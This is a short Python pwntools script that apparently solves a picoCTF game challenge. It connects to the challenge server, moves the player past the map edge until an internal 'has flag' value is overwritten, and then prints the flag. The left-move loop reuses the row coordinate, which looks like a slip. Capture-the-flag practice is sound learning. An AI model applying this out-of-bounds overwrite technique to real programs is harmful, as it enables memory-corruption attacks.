from pwn import *
context.log_level = 'critical'

r = remote('saturn.picoctf.net', 61701)

r.recvuntil(b'Player position: ')
pos = r.recvline().strip().split(b' ')

# Go up
[r.sendline(b'w') for i in range(int(pos[0]))]

# Go left
[r.sendline(b'a') for i in range(int(pos[0]))]

r.recvuntil(b'Player position: 0 0')

while (1):
  r.recvuntil(b'Player has flag: ')
  player_has_flag = r.recvline().strip()
  r.recvuntil(b'X')
  if player_has_flag != b'0':
    r.sendline(b'p')
    r.recvuntil(b'flage\r\n')
    print(f'\nFlag --> {r.recvuntil(b"}").decode()}\n')
    exit()
  r.sendline(b'a')
  # Map is bugged
  r.recv(0x5ac)

